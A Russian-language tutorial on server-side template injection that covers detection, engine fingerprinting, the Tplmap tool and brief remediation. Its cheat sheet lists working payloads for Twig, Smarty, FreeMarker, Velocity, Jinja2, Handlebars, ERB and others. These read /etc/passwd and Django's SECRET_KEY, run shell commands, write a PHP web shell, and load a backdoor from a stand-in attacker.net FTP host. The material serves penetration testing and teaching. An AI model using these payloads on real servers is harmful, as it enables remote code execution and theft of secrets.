# Что такое SSTI?

Внедрение шаблона на стороне сервера — это уязвимость, при которой злоумышленник [вводит вредоносные данные](https://cobalt.io/vulnerability-wiki/v10-malicious) в шаблон для выполнения команд на стороне сервера. Эта уязвимость возникает, когда в обработчик шаблонов внедряются неверные данные пользователя, что обычно может привести к удаленному выполнению кода (RCE).

Механизмы шаблонов предназначены для объединения шаблонов с моделью данных для создания результирующих документов, которые помогают заполнять динамические данные на веб-страницах. Механизмы шаблонов можно использовать для отображения информации о пользователях, продуктах и ​​т. д. Ниже перечислены некоторые из наиболее популярных механизмов шаблонов:

-   PHP-Smarty, Twigs
-   JAVA-Velocity, Freemaker
-   Python–JINJA,Mako,Tornado • JavaScript–Jade,Rage
-   Ruby – Liquid

Если проверка ввода не обрабатывается должным образом на стороне сервера, вредоносная полезная нагрузка внедрения шаблона на стороне сервера может быть выполнена на сервере, что может привести к удаленному выполнению кода.

---

# Как это работает?

Для простоты представьте, что вы тестируете параметр следующего запроса:

```
POST /some-endpoint HTTP/1.1  
Host: vulnerable-website.com  
parameter=value
```

Чтобы обнаружить уязвимость, используйте полезную нагрузку полиглота в качестве значения параметра, который представляет собой последовательность специальных символов, таких как следующие:

```
POST /some-endpoint HTTP/1.1  
Host: vulnerable-website.com  
parameter=${{<%[%'"}}%\.
```

Чтобы определить механизм шаблонов, прочитайте сообщение об ошибке:

![[Pasted image 20230211190220.png]]


Если сообщение об ошибке не отображает механизм шаблонов, мы можем протестировать известные синтаксисы для популярных механизмов шаблонов:

```
=${7*3}  
={{7*3}}  
=<%= 7*3 %>
```

Ознакомьтесь с документацией руководства по механизму шаблонов (в данном случае это Django) и используйте следующую полезную нагрузку для чтения вывода отладки:

```
POST /some-endpoint HTTP/1.1  
Host: vulnerable-website.com  
parameter={% debug %}
```

Вывод будет содержать список объектов и свойств, к которым у вас есть доступ из этого шаблона:

![[Pasted image 20230211190334.png]]

Прочитайте секретный ключ, используя доступный объект «Настройки»:

```
POST /some-endpoint HTTP/1.1  
Host: vulnerable-website.com  
parameter={{settings.SECRET_KEY}}
```

----

# Каково влияние SSTI?

Воздействие уязвимостей внедрения шаблонов на стороне сервера, как правило, критично, что приводит к удаленному выполнению кода за счет получения полного контроля над внутренним сервером. Даже без выполнения кода злоумышленник может прочитать конфиденциальные данные на сервере. Также бывают редкие случаи, когда уязвимость SSTI не является критической, в зависимости от механизма шаблонов.

---

# Как определить уязвимость?

Чтобы определить уязвимости SSTI, используйте полезные данные Polyglot, состоящие из специальных символов, обычно используемых в выражениях шаблона, для фаззинга шаблона.

```
${{<%[%'"}}%\. 
```

В случае уязвимости сервер может вернуть сообщение об ошибке или создать исключение. Это можно использовать для определения уязвимости и используемого механизма шаблонов.

Для выявления уязвимости можно выполнить следующий список действий:

-   Определите, где существует внедрение шаблона
-   Определите механизм шаблонов и проверьте уязвимость
-   Следуйте руководствам для конкретного механизма шаблонов.
-   Воспользуйтесь уязвимостью

Следующая шпаргалка может быть использована для определения используемого механизма шаблонов:

![[Pasted image 20230211190730.png]]

# Автоматизированные инструменты

Tplmap помогает использовать уязвимости внедрения кода и внедрения шаблонов на стороне сервера с помощью нескольких методов выхода из песочницы для получения доступа к базовой операционной системе.

Инструмент и его набор тестов разработаны для исследования класса уязвимостей SSTI и для использования в качестве наступательных инструментов безопасности во время тестов на проникновение веб-приложений.

Для получения дополнительной информации, пожалуйста, проверьте репозиторий GitHub для инструмента [здесь](https://github.com/epinna/tplmap) .

---

# Шпаргалка

```
--------------------------------------------------------------------
Polyglot:
${{<%[%'"}}%\  
--------------------------------------------------------------------
FreeMarker (Java):  
${7*7} = 49  
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }  
--------------------------------------------------------------------  
(Java):  
${7*7}  
${{7*7}}  
${class.getClassLoader()}  
${class.getResource("").getPath()}  
${class.getResource("../../../../../index.htm").getContent()}  
${T(java.lang.System).getenv()}  
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}  
--------------------------------------------------------------------  
Twig (PHP):  
{{7*7}}  
{{7*'7'}}  
{{dump(app)}}  
{{app.request.server.all|join(',')}}  
"{{'/etc/passwd'|file_excerpt(1,30)}}"@  
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}  
--------------------------------------------------------------------  
Smarty (PHP):  
{$smarty.version}  
{php}echo `id`;{/php}  
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}  
--------------------------------------------------------------------
Handlebars (NodeJS): 
wrtz{{#with "s" as |string|}}  
{{#with "e"}}  
{{#with split as |conslist|}}  
{{this.pop}}  
{{this.push (lookup string.sub "constructor")}}  
{{this.pop}}  
{{#with string.split as |codelist|}}  
{{this.pop}}  
{{this.push "return require('child_process').exec('whoami');"}}  
{{this.pop}}  
{{#each conslist}}  
{{#with (string.sub.apply 0 codelist)}}  
{{this}}  
{{/with}}  
{{/each}}  
{{/with}}  
{{/with}}  
{{/with}}  
{{/with}}  
--------------------------------------------------------------------
Velocity: 
#set($str=$class.inspect("java.lang.String").type)  
#set($chr=$class.inspect("java.lang.Character").type)  
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))  
$ex.waitFor()  
#set($out=$ex.getInputStream())  
#foreach($i in [1..$out.available()])  
$str.valueOf($chr.toChars($out.read()))  
#end  
-------------------------------------------------------------------  
ERB (Ruby):  
<%= system("whoami") %>  
<%= Dir.entries('/') %>  
<%= File.open('/example/arbitrary-file').read %>  
--------------------------------------------------------------------  
Django Tricks (Python):
{% debug %}  
{{settings.SECRET_KEY}}  
--------------------------------------------------------------------  
Tornado (Python):  
{% import foobar %} = Error  
{% import os %}{{os.system('whoami')}}  
--------------------------------------------------------------------  
Mojolicious (Perl):
<%= perl code %>  
<% perl code %>  
--------------------------------------------------------------------
Flask/Jinja2: Identify:  
{{ '7'*7 }}  
{{ [].class.base.subclasses() }} # get all classes  
{{''.class.mro()[1].subclasses()}}  
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}  
--------------------------------------------------------------------
Flask/Jinja2:  
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}  
--------------------------------------------------------------------  
Jade:  
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}  
--------------------------------------------------------------------  
Razor (.Net):
@(1+2)  
@{// C# code}  
--------------------------------------------------------------------
```


---

# Исправление

Способы устранения [уязвимости SSTI](https://cobalt.io/vulnerability-wiki/v5-validation-sanitization/ssti) зависят от различных используемых механизмов шаблонов. Есть 2 распространенных предложения по устранению этой уязвимости:

-   Дезинфекция: дезинфицируйте пользовательский ввод перед его передачей в шаблоны, чтобы свести к минимуму уязвимости от любых вредоносных программ.
-   Песочница: если использование рискованных персонажей необходимо для бизнеса, рекомендуется использовать песочницу в безопасной среде.